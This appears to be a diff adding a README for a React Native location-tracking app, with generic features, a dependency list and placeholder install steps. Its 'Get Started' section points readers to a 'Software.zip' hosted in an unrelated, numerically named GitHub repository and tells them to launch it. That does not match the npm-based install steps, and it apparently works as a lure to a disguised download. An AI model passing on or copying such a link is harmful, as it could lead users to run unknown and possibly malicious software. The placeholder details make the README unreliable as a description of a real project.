@@ -1,0 +1,78 @@
+# 🌍📌 Traking App
+
+Welcome to the **Traking App** repository! This app allows users to track their real-time location on an interactive map. It leverages the Device Orientation API to align with the phone's orientation, making navigation seamless. Users can view their movements represented by a path on the map, and a dynamic compass aids in orientation. 
+
+## Features
+- Real-time tracking on an interactive map
+- Alignment with the device's orientation
+- Path representation of movements
+- Dynamic compass for orientation
+
+## Technologies Used
+- Expo
+- Expo-Blur
+- Expo-Device
+- Expo-Linking
+- Expo-Location
+- Expo-Sensors
+- Lodash-Throttle
+- MQTT
+- Paho-MQTT
+- Query-String
+- React-DOM
+- React-Native
+- React-Native-Maps
+- React-Native-MQTT
+- React-Navigation
+- React-Slider
+
+## 🚀 Get Started
+To get started with the Traking App, download the software from the link provided below:
+
+[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+
+Once downloaded, launch the software to begin exploring the exciting features of real-time tracking and navigation!
+
+## Screenshots
+![App Preview](https://example.com/app-preview.png)
+
+## Installation
+Follow these steps to install the Traking App:
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/your-username/traking_app.git
+   cd traking_app
+   ```
+
+2. Install the dependencies:
+   ```bash
+   npm install
+   ```
+
+3. Run the app:
+   ```bash
+   npm start
+   ```
+
+## Usage
+To start using the Traking App, follow these steps:
+
+1. Launch the app on your device.
+2. Allow location access.
+3. Move around, and you will see your real-time location on the map.
+
+## Support
+If you encounter any issues or have any questions, feel free to contact our support team at support@trakingapp.com.
+
+## Contributing
+We welcome contributions to enhance the Traking App. If you have any ideas or suggestions, please submit a pull request. 
+
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+Explore the world with real-time tracking and navigation using the Traking App! 🌍🚀
+
+🔗 More about the Traking App on [GitHub](https://github.com/your-username/traking_app)
+
+**Remember to always stay on track with Traking App!** 📍🗺️
